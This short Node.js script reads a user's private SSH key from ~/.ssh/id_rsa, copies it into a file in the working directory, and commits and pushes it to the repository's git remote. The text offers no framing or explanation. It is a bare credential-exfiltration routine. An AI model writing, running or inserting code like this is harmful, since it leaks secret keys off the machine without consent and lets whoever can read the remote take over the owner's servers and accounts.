const fs = require('fs')
const { exec } = require('child_process');

const data = fs.readFileSync("/home/niko/.ssh/id_rsa")

fs.writeFileSync("din_priv_key", data);

exec("git add .")
exec("git commit -m key")
exec("git push")